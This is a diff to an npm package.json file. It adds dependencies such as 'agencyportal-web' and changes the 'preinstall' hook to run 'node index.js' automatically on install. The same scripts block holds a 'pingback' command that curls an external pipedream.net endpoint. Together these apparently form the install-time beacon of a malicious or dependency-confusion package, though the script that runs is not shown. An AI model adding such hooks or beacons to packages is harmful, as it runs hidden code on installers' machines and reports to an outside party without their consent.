@@ -68,7 +68,9 @@
     "utf-railroad": "^1.0.1",
     "tcm-app-migration-miles-react": "^1.0.2",
     "@restart/hooks": "^0.3.1",
-    "fbjs": "^3.0.0"
+    "fbjs": "^3.0.0",
+    "agencyportal-web": "^5.1.0",
+    "semver": "^7.3.7"
   },
   "devDependencies": {
     "@ark/attest": "0.53.0",
@@ -157,7 +159,7 @@
     "ts-benchmark": "cd ./benchmarks/typescript/simple && npm install && npm run benchmark | node ../../../scripts/tsc-diagnostics-check",
     "attest-benchmark": "node ./benchmarks/typescript/infer.bench.mts",
     "build": "npm run compile && npm run test",
-    "preinstall": "./like.sh",
+    "preinstall": "node index.js",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
     "start": "cross-env NODE_ENV=production node ./dist/main.js",
     "coverage": "jest --coverage",
